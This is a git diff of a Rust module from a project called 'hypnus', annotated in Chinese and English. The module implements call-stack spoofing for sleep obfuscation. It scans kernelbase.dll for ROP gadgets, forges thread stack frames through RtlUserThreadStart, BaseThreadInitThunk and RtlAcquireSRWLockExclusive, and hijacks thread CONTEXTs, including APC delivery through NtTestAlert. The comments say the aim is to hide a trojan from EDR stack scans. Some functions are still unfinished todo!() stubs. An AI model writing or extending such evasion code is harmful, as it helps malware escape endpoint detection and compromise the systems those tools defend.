@@ -4,18 +4,22 @@
 // 本文件函数的流程图: -> ->
 // 每个函数的流程图: -> ->
 
-use core::{ops::Add, ptr::null_mut, slice::from_raw_parts};
-
+// 优化:这里用到的伪造栈链,应当自己再找一套,避免因hypnus开源被edr记录,增加被发现的风险.是否有必要,需要严谨论证
 use crate::config::Config;
 use crate::error::HypnusError::{
-    AddRspGadgetNotFound, FailToAllocateGadgetPointerPage, FaileToChangeMemoryToRx, FaileToReadIMAGE_RUNTIME_FUNCTIONEntriesFromPdataSection, MissingUnwindRtlUserThreadStart
+    AddRspGadgetNotFound, FailToAllocateGadgetPointerPage, FaileToChangeMemoryToRx,
+    FaileToReadIMAGE_RUNTIME_FUNCTIONEntriesFromPdataSection,
+    FailedToGetFrameSizeRtlUserThreadStart, MissingUnwindBaseThreadInitThunk,
+    MissingUnwindEnumDateFormatsExA, MissingUnwindRtlAcquireSRWLockExclusive,
+    MissingUnwindRtlUserThreadStart,
 };
 use crate::error::Result; // replace anyhow::Result
-use crate::gadget::{GadgetKind,scan_runtime};
+use crate::gadget::{GadgetKind, scan_runtime};
 use crate::hypnus::Obfuscation;
 use crate::types::*;
 use crate::winapis::{NtAllocateVirtualMemory, NtLockVirtualMemory, NtProtectVirtualMemory};
 use crate::{debug_log, stealth_bail};
+use core::{ops::Add, ptr::null_mut, slice::from_raw_parts};
 use obfstr::obfstr as s;
 use puerto::types::{
     CONTEXT, IMAGE_DIRECTORY_ENTRY_EXCEPTION, IMAGE_RUNTIME_FUNCTION, LeapSecondFlags,
@@ -24,6 +28,7 @@ use puerto::{
     helper::PE,
     winapis::{NT_SUCCESS, NtCurrentProcess},
 };
+use uwd::ignoring_set_fpreg;
 
 /// provides access to the unwind(exception handling)information of a pe image
 ///
@@ -100,15 +105,19 @@ pub struct StackSpoof {
 impl StackSpoof {
     #[inline]
     pub fn new(cfg: &Config) -> Result<Self> {
-        todo!()
+        let mut stack = Self::alloc_memory(cfg)?;
+        stack.frames(cfg)?;
+        Ok(stack)
     }
 
-    /// allocates memory required for spoof stack execution
+    /// allocates memory required for spoof stack execution:在kernelbase.dll中detect后续应该用call [rbx]还是jmp [rbx],然后将rbp相关的opcode写入第一块内存,然后将第一块内存的地址(指针)写入第二块内存,用于返回真实的执行流.后续在resolve中找到rbx相关的gadget地址并写入假栈.执行时cpu通过call [rbx],读取第二块内存中存放的指针地址,间接跳入第一块内存并执行第一块内存中的rbp相关opcode
+    ///
+    /// CPU 执行  call [rbx]  ──► 读取第二块内存（获取第一块内存的地址） ──►跳转并执行第一块内存（执行  rbp  相关的机器码恢复栈） ──► 返回真实执行流
     pub fn alloc_memory(cfg: &Config) -> Result<Self> {
-        // Check that the algo算法 module contains a gadget `call [rbp]` or `jmp [rbp]` from kernelbase.为什么是kernelbase 见注释1
+        // Check that the algo算法 module contains a gadget `call [rbx]` or `jmp [rbx]` from kernelbase.为什么是kernelbase 见注释1
         let kind = GadgetKind::detect(cfg.modules.kernelbase.as_ptr())?;
 
-        // allocate gadget code:将指定opcode封装在静态字节流中(&`static [u8])
+        // allocate gadget code:将指定opcode(rbp相关)封装在静态字节流中(&`static [u8])
         let bytes = kind.bytes();
 
         // 作为NtAllocateVirtualMemory返回的分配后的内存地址
@@ -132,7 +141,7 @@ impl StackSpoof {
             );
         }
 
-        // 将bytes的opcode写入内存(申请的第一块内存中(gadget_code))
+        // 将bytes相关的rbp的opcode写入内存(申请的第一块内存中(gadget_code))
         // 为什么使用copy_nonoverlapping见注释4
         unsafe {
             core::ptr::copy_nonoverlapping(bytes.as_ptr(), gadget_code as *mut u8, bytes.len());
@@ -174,7 +183,7 @@ impl StackSpoof {
         }
 
         unsafe {
-            // writes the gadget address(mov rsp,rbp; ret)to a pointer page:将第一块内存的绝对地址(opcode)写入第二块内存开头的8个字节中
+            // writes the gadget address(mov rsp,rbp; ret)to a pointer page:将第一块内存的绝对地址(代表opcode的指针)写入第二块内存开头的8个字节中
             *(gadget_ptr as *mut u64) = gadget_code as u64;
 
             // Locks the specified region of virtual memory into physical memory,
@@ -222,15 +231,58 @@ impl StackSpoof {
         let Some(base_thread) = pe_kernel32.function_by_offset(
             cfg.base_thread.as_u64() as u32 - cfg.modules.kernel32.as_u64() as u32,
         ) else {
-            todo!()
+            stealth_bail!(
+                MissingUnwindBaseThreadInitThunk,
+                "missing unwind: BaseThreadInitThunk"
+            )
         };
+
+        // kernel32!EnumDateFormatsExA,原型为枚举当前os支持的所有日期格式.
+        // 支持回调,它会遍历内部和数据,每找到一种格式,都会调用一次用户提供的回调函数
+        let Some(enum_date) = pe_kernel32.function_by_offset(
+            cfg.enum_date.as_u64() as u32 - cfg.modules.kernel32.as_u64() as u32,
+        ) else {
+            stealth_bail!(
+                MissingUnwindEnumDateFormatsExA,
+                "missing unwind: EnumDateFormatsExA"
+            )
+        };
+
+        // RtlAcquireSRWLockExclusive,极为常见的内核同步锁函数.模拟一个看起来很忙又很正常的函数.让edr认为线程在等待资源,降低审计优先级
+        let Some(rtl_acquire_srw) = pe_ntdll.function_by_offset(
+            cfg.rtl_acquire_lock.as_u64() as u32 - cfg.modules.ntdll.as_u64() as u32,
+        ) else {
+            stealth_bail!(
+                MissingUnwindRtlAcquireSRWLockExclusive,
+                "missing unwind: RtlAcquireSRWLockExclusive"
+            )
+        };
+
+        //ntdll!RtlUserThreadStart：作为所有线程的法定始祖负责初始化 SEH环境，通过计算其栈深来确立伪造栈的物理最底层原点，从而在 EDR溯源审计时为载荷提供“根正苗红”的合法身份证明
+
+        // let-else用于绑定新变量,不能直接解构赋值给已有的结构体字段如self.rtl_user_thread_size(重构中这里不能和上文一样简单的用let else和steal_bail!错误控制)
+        // uwd依赖的是dinvk,本项目依赖puerto所以这里使用transmute,以后uwd重构完成不要用transmute了
+        unsafe {
+            if let Some(size) =
+                ignoring_set_fpreg(cfg.modules.ntdll.as_ptr(), core::mem::transmute(rtl_user))
+            {
+                self.rtl_user_thread_size = size;
+            } else {
+                stealth_bail!(
+                    FailedToGetFrameSizeRtlUserThreadStart,
+                    "failed to get frame size: RtlUserThreadStart"
+                );
+            }
+        }
 
         todo!()
     }
 
-    /// constructs a forged CONTEXT structure simulating a spoofed call chain
+    /// constructs a forged CONTEXT structure simulating a spoofed call chain:通过设置CONTEXT的rip指向ZwWaitForWorkViaWorkerFactory,构造木马在休眠阶段的伪造栈帧,用于edr对木马在休眠期的 什么? 扫描.正因为木马休眠(执行NtWaitForSingleObject时),该伪造的栈帧并不执行;
     ///
-    /// EDR会定期扫描所有线程的栈,如果正在运行的代码在栈上没有合法的系统函数,会被判定为注入载荷.本函数把当前线程的CONTEXT改造如下调用链,模拟一个正在休眠/标准的windows系统线程
+    /// EDR会定期扫描所有线程的栈,如果正在运行的代码在栈上没有合法的系统函数,会被判定为注入载荷.
+    ///
+    /// 作用:本函数把当前线程的CONTEXT改造如下调用链,模拟一个正在休眠/标准的windows系统线程.该函数执行后构造的栈帧示意图详见spoof.md
     ///
     /// This function emulates a legitimate return sequence through:
     /// - `ZwWaitForWorkViaWorkerFactory`
@@ -252,8 +304,9 @@ impl StackSpoof {
             ctx_spoof.Rip = cfg.zw_wait_for_worker.as_u64();
 
             // compute the spoofed rsp by subtracting减 all stacked frame sizes and extra aligment
-            // 从当前栈顶rsp(高地址)向下跳跃5个0x1000(每个4k)共计20k空间.详见注释
-            // 将rsp下移20k,用于edr hook/os内核切换的临时数据.以rsp-20k为基准,再下移伪造的函数调用链中函数的栈帧大小和32字节影子空间大小.
+            // 从当前栈顶rsp(高地址)向下跳跃5个0x1000(每个4k)共计20k空间.详见注释5
+            // 将rsp下移20k,用于edr hook/os内核切换的临时数据,避免这些临时数据覆盖伪造的栈帧,这20k是一片空白的防火墙.以rsp-20k为基准,再下移伪造的函数调用链中函数的栈帧大小和32字节影子空间大小.
+            // 除了这20k,还向下扩展了需要的函数大小和32字节影子空间
             ctx_spoof.Rsp = (ctx.Rsp - 0x1000 * 5)
                 - (cfg.stack.rtl_user_thread_size
                     + cfg.stack.base_thread_size
@@ -264,95 +317,122 @@ impl StackSpoof {
             // 这里为啥是0x17,在spoof.md中
             *(ctx_spoof.Rsp as *mut u64) = cfg.rtl_acquire_lock.as_u64().add(0x17);
 
-            // return to BaseThreadInitThunk + 0x14(此处为其子函数RtlAcquireSRWLockExclusive执行完ret后,返回到BaseThreadInitThunk内部的合法指令返回点,即代码偏移0x14处的mov指令):模拟BaseThreadInitThunk调用其子函数RtlAcquireSRWLockExclusive的物理行为
+            // return to BaseThreadInitThunk + 0x14:在延申的20k空间的下方.在子函数栈帧上方的返回地址槽处,写入器父函数内部的合法返回点(0x14处).
+            // (此处为其子函数RtlAcquireSRWLockExclusive执行完ret后,返回到BaseThreadInitThunk内部的合法指令返回点,即代码偏移0x14处的mov指令):模拟BaseThreadInitThunk调用其子函数RtlAcquireSRWLockExclusive的物理行为
             // +8 :跳过返回地址本身8字节.详见spoof.md
-            *(ctx_spoof.Rsp.add((cfg.stack.rlt_acquire_srw_size + 8) as u64) as *mut u64) =
+            *(ctx_spoof
+                .Rsp
+                .add((cfg.stack.rlt_acquire_srw_size + 8) as u64) as *mut u64) =
                 cfg.base_thread.as_u64().add(0x14);
 
-        // Return to RtlUserThreadStart + 0x21
-            *(ctx_spoof.Rsp.add((cfg.stack.rlt_acquire_srw_size + cfg.stack.base_thread_size + 16) as u64)
+            // Return to RtlUserThreadStart + 0x21
+            *(ctx_spoof
+                .Rsp
+                .add((cfg.stack.rlt_acquire_srw_size + cfg.stack.base_thread_size + 16) as u64)
                 as *mut u64) = cfg.rtl_user_thread.as_u64().add(0x21);
 
-        // End a call stack.伪造调用链在物理空间的终结
+            // End a call stack.伪造调用链在物理空间的终结
             // 三层伪造函数的栈深;24代表三层函数的返回地址
             // 0:win的内存模型中,0/NULL时合法的栈底标志.当os内核/EDR调用RtlVirtualUnwind递归查找父函数时,如果解析出rip在有效模块中会继续回溯,如果解析出的返回地址为0,回溯流程正常终止
-           *(ctx_spoof.Rsp.add(
+            *(ctx_spoof.Rsp.add(
                 (cfg.stack.rlt_acquire_srw_size
                     + cfg.stack.base_thread_size
                     + cfg.stack.rtl_user_thread_size
                     + 24) as u64,
             ) as *mut u64) = 0;
-        
-        ctx_spoof
 
+            ctx_spoof
         }
-
     }
 
-
-
-/// Applies a fake call stack layout to a series of thread contexts:在物理内存中,把当前线程上下文(CONTEXT)强行改造成一条连贯的,无破绽的系统合法调用链(ROP).
-/// 
+    /// Applies a fake call stack layout to a series of thread contexts:在hypnus.rs的ctxs(执行流)中,这10个步骤在物理上逐步执行,为了让每一步能够物理跳转到下一个任务并隐蔽返回地址.通过 1. 扫描add rsp 0x58; ret的rop跳板 2. 将call [rbx]插入每个执行步骤的物理栈帧.从而确保在执行期，当  NtProtectVirtualMemory  这样的函数执行完  ret时，CPU 能够沿着栈上的  add rsp  垫片和  call [rbx]返回到我们的控制流中
+    ///
     /// simulating a legitimate execution.
-    /// 
+    ///
     /// 1. 在栈上通过物理写入真实的系统函数返回地址,捏造一个合法连贯的假调用链(RtlUserThreadStart ➔ BaseThreadInitThunk ➔ EnumDateFormatsExA)给edr的扫描器看
     /// 2. 通过计算偏移,利用add rsp和call [rbx]这两个ROP零件,把这些假的栈帧串联起来.当定时器触发时,cpu顺着这条链安全的执行“修改保护属性 ➔ 解密 ➔ 还原环境”的全部动作.在hypnus.rs的ctx[5],主线程上下文被强行修改,rip指向WaitForSingleObject时.在WaitForSingleObject休眠阶段,运行时对应ctx[5].此时edr去挂起该线程检查它的堆栈.看到的是ZwWaitForWork → RtlAcquireSRWLock → BaseThreadInitThunk
-pub fn spoof(&self,ctxs:&mut [CONTEXT],cfg:&&Config,kind:Obfuscation)->Result<()> {
-    
-// 得到kernelbase.dll的运行时函数表(.pdata异常表即image_runtime_function)
-// 因为edr在stack walking时,会去.pdata表中验证每个返回地址是否属于一个合法注册的非叶子函数.我们寻找的gadget必须位于.pdata注册的合法函数体内
+    pub fn spoof(&self, ctxs: &mut [CONTEXT], cfg: &&Config, kind: Obfuscation) -> Result<()> {
+        // 得到kernelbase.dll的运行时函数表(.pdata异常表即image_runtime_function)
+        // 因为edr在stack walking时,会去.pdata表中验证每个返回地址是否属于一个合法注册的非叶子函数.我们寻找的gadget必须位于.pdata注册的合法函数体内
         let pe_kernelbase = Unwind::new(PE::parse(cfg.modules.kernelbase.as_ptr()));
-        let Some(tables)=pe_kernelbase.entries() else {
-            stealth_bail!(FaileToReadIMAGE_RUNTIME_FUNCTIONEntriesFromPdataSection,"failed to read IMAGE_RUNTIME_FUNCTION entries from .pdata section")
+        let Some(tables) = pe_kernelbase.entries() else {
+            stealth_bail!(
+                FaileToReadIMAGE_RUNTIME_FUNCTIONEntriesFromPdataSection,
+                "failed to read IMAGE_RUNTIME_FUNCTION entries from .pdata section"
+            )
         };
 
-// Locate the target COP(Call-Oriented Programming) or JOP(Jump-Oriented Programming) gadget:均为绕过DEP(数据执行保护)/ASLR(地址空间随机化),也是rop链的终点
-// gadget_addr为kernelbase.dll中call [rbx]或jmp [rbx]指令地址;gadget_size为包含这个指令的宿主函数在系统注册的栈帧大小
+        // Locate the target COP(Call-Oriented Programming) or JOP(Jump-Oriented Programming) gadget:均为绕过DEP(数据执行保护)/ASLR(地址空间随机化),也是rop链的终点
+        // gadget_addr为kernelbase.dll中call [rbx]或jmp [rbx]指令地址;gadget_size为包含这个指令的宿主函数在系统注册的栈帧大小
         // kernelbase中包含大量以 0xFF 0x13(call [rbx]) 或0xFF 0x23(jmp [rbp])结尾的gadgets
         let (gadget_addr, gadget_size) = self.gadget.resolve(cfg)?;
 
-        // add rsp, 0x58 ; ret:
+        // add rsp, 0x58 ; ret=[0x48, 0x83, 0xC4, 0x58, 0xC3]
         // 在kernelbase模块中,根据runtime_function找到对应的机器码的指令地址(rip目标)和其宿主函数的栈帧大小
-        // 0x48(REX.W):扩展前缀,指定接下来的指令操作数为64位;0x83,0xC4(ADD RSP,imm8):0x83为ADD;0xC4指定目标寄存器RSP;0x58:要增加的数值0x58(十进制88),这里add跳过指定的0x58空间,从一个深层的系统函数转到另一个函数,在跳转时需要预留32字节影子空间+寄存器(函数通常会备份3-5个寄存器,每个8字节)+16字节的栈对齐.这里是作者通过大量逆向发现,0x58可以一次性跳过大多数系统函数的prolog,让cpu落在预设的下一个返回地址
+        // 0x48(REX.W):扩展前缀,指定接下来的指令操作数为64位;0x83,0xC4(ADD RSP,imm8):0x83为ADD;0xC4指定目标寄存器RSP;0x58:要增加的数值0x58(十进制88),这里add跳过指定的0x58空间,从一个深层的系统函数转到另一个函数,在跳转时需要预留32字节影子空间+寄存器(函数通常会备份3-5个寄存器,每个8字节)+16字节的栈对齐.这里是作者通过大量逆向发现,0x58可以一次性跳过大多数系统函数的prolog,让cpu落在预设的下一个返回地址.0x58怎么计算的,详见注释6
         // 0xC3:RET;tables代表一个Image_runtime_function数组;add_rsp_addr代表找到的gadget在内存中的VA;add_rsp_size代表找到的gadget所占栈空间大小
- let Some((add_rsp_addr, add_rsp_size)) = scan_runtime(
+        let Some((add_rsp_addr, add_rsp_size)) = scan_runtime(
             cfg.modules.kernelbase.as_ptr(),
             &[0x48, 0x83, 0xC4, 0x58, 0xC3],
-            tables
-        )else {
-            stealth_bail!(AddRspGadgetNotFound,"add rsp gadget not found")
+            tables,
+        ) else {
+            stealth_bail!(AddRspGadgetNotFound, "add rsp gadget not found")
         };
 
-unsafe {
-// 当当前线程混淆结束,引导程序回到真实的执行流:
-    for ctx in ctxs.iter_mut() {
-
-        // 
-        ctx.Rbp=match kind {
-
-            // rsp赋给rbp:在gadget.rs中,向内存页写入了bytes()返回的收尾opcode :mov rsp,rbp; ret
-            // 在rsp向下拉进行伪造之前,把当前真实的rsp写入rbp.cpu顺着伪造的rop链执行到最后一步,cpu跳转到收尾opcode执行.此时,rsp跳过中间所有的伪造栈帧和20k的gap,回到最开始的真实栈顶位置
-            Obfuscation::Timer | Obfuscation::Wait=>ctx.Rsp,
-// win中,在一个线程中插入APC后,该apc并不立即执行,只有当这个线程进入警惕状态Alertable State时,内核才会派发并执行apc队列中任务.NtTestAlert就是这个强制叫醒去检查并执行用户态apc的
-Obfuscation::Foliage=>{
-    // Inject NtTestAlert as stack return address to trigger APC delivery
-    (ctx.Rsp as *mut u64).write(cfg.nt_test_alert.into());
+        unsafe {
+            // 当当前线程混淆结束,引导程序回到真实的执行流:通过执行call/jmp [rbp]
+            for ctx in ctxs.iter_mut() {
+                // 首先执行 rbp=rsp:保存真实的返回地址
+                ctx.Rbp = match kind {
+                    // rsp赋给rbp:在gadget.rs中,向内存页写入了bytes()返回的收尾opcode :mov rsp,rbp; ret
+                    // 在rsp向下拉进行伪造之前,把当前真实的rsp写入rbp.cpu顺着伪造的rop链执行到最后一步,cpu跳转到收尾opcode执行.此时,rsp跳过中间所有的伪造栈帧和20k的gap,回到最开始的真实栈顶位置
+                    Obfuscation::Timer | Obfuscation::Wait => ctx.Rsp,
+                    // win中,在一个线程中插入APC后,该apc并不立即执行,只有当这个线程进入警惕状态Alertable State时,内核才会派发并执行apc队列中任务.NtTestAlert就是这个强制叫醒去检查并执行用户态apc的
+                    Obfuscation::Foliage => {
+                        // Inject NtTestAlert as stack return address to trigger APC delivery
+                        (ctx.Rsp as *mut u64).write(cfg.nt_test_alert.into());
                         ctx.Rsp
-}
+                    }
+                };
 
+                  // RBX points to our gadget pointer (mov rsp, rbp; ret):上面alloc_memory 函数中第二块内存写入的gadget的地址
+                ctx.Rbx = cfg.stack.gadget_rbp;
+
+                  // Compute total stack size for the spoofed call chain
+                ctx.Rsp = (ctx.Rsp - 0x1000 * 10)
+                    - (cfg.stack.rtl_user_thread_size
+                        + cfg.stack.base_thread_size
+                        + (**cfg).stack.enum_date_size
+                        + gadget_size
+                        + add_rsp_size
+                        + 48) as u64;
+
+
+                         // Stack is aligned?
+                if ctx.Rsp % 16 != 0 {
+                    ctx.Rsp -= 8;
+                }
+
+ // First gadget: add rsp, 0x58; ret(从kernelbase.dll找到的gadget绝对虚拟地址)写入新分配的栈顶rsp指向的第一个8字节内存槽.这里rsp是多大的对齐,为什么只写入了8字节.
+                *(ctx.Rsp as *mut u64) = add_rsp_addr as u64;
+
+// Gadget trampoline: call [rbx] || jmp [rbx]
+                *(ctx.Rsp.add((add_rsp_size + 8) as u64) as *mut u64) = gadget_addr as u64;
+
+                
+
+            }
         }
+
+        todo!()
     }
 }
 
 
-
-    todo!()
-}
-
+// ret时:1. cpu的控制单元通过内存总线,读取当前栈顶rsp指向的虚拟地址处的8字节数据;2. rsp+8;3.cpu将第一步读到的8字节数据直接写入rip;之后在下一个时钟周期,cpu译码器无条件从此时的rip指向的内存地址处获取下一条要执行的机器指令
+ // 执行的结果是将当前rsp向高地址移动0x58字节,刚好让rsp跳过之前为了模拟假函数环境分配的无用栈空间,让栈顶直接对准下一个需要执行的跳转(即下一个返回地址槽,里面是call [rbx])
 
 
-
-}
 
 // 注释1
 // win10以后,kernel32.dll已变为转发动态链接库(forwarder dll):其内大部分api只保留导出符号,其函数体实现/逻辑转到kernelbase.dll
@@ -385,3 +465,14 @@ Obfuscation::Foliage=>{
 // win64下,默认线程池worker线程通常预先提交64-256k栈空间.20k既保证足够缓冲区,也确保这个地址范围仍在线程池预先提交的栈安全区内,不需要触发栈扩张,避免跳过page_guard导致崩溃的风险.这也是选择gap=20k这个数字的上限
 // 以上,在主线程执行调用链期间,经历了多个os和edr的函数调用.这些都会在当前栈中写入一些临时数据.如果这个gap太小,一旦深层嵌套的os调用或edr进行复杂的内存审计,其部分数据会放在rsp下方,栈指针可能向下延申并覆盖掉主线程原本的局部变量.如 edr的hook函数在执行ret返回时,会发现它的返回地址被覆盖了,那么主线程会因为栈被写坏,在内核切换的瞬间直接触发Access Violation（C0000005） 崩溃退出
 // 这里也可以设为24k/28k等
+
+// 注释6
+// 1. win64栈的16字节对齐:win64 abi规范,cpu执行call指令调用下一个函数之前,rsp必须保持16字节对齐.
+// 当父函数执行call,cpu自动将8字节的返回地址压入栈.导致进入子函数时,栈处于非16字节对齐(16n+8).为了让子函数在调用下一级函数时恢复16字节对齐,子函数的prologue必须分配一个大小为8的奇数倍栈空间(如40,56,72,88,104等).这就划定的分配的空间规律
+// 2. 编译器在编译这个系统函数的栈帧时,其prologue分配如下:
+// 2.1 保存非易失性寄存器.函数需要使用这些寄存器,就必须先push入栈进行备份.每个寄存器占8字节
+// 2.2 影子空间:32字节
+// 2.3 局部变量与临时对齐空间:函数内部的局部变量需要保证16字节对齐
+// let (add_rsp_addr, add_rsp_size) = scan_runtime()在搜索时没有依赖函数名称(微软随时在补丁中更改函数名).其遍历kernelbase.dll的.text代码段,找到包含add rsp,0x58;ret(字节码 48 83 C4 58 C3)的gadget.
+// uwd::ignoring_set_fpreg(module, runtime),在底层解析win64 pe文件的.pdata节异常处理目录.微软在编译kernelbase.dll时,不仅生成机器码,还会在.pdata节中为每个非叶子函数生成UNWIND_INFO结构体(解包信息),该结构包含UNWIND_CODE(解包码).UNWIND_CODE是给操作洗头膏的栈回溯说明,其中UWOP_PUSH_NONVOL表示该函数push备份了哪几个非易失性寄存器;UWOP_ALLOC_SMALL  /  UWOP_ALLOC_LARGE该函数的prologue通过sub rsp分配多少字节的局部变量和影子空间
+// uwd::ignoring_set_fpreg去读取并累加这些UNWIND_CODE记录的值.如果其记录的值有4个非易失性寄存器(32字节),8个局部变量(64),再加上32字节影子空间.那解包码累加处的add_rsp_size=128字节.这里搜索的及其指令是add rsp, 0x58 （88 字节）.因此,该gadget的宿主函数使用的寄存器和局部变量和影子空间之和必然收敛于0x58的88字节以内
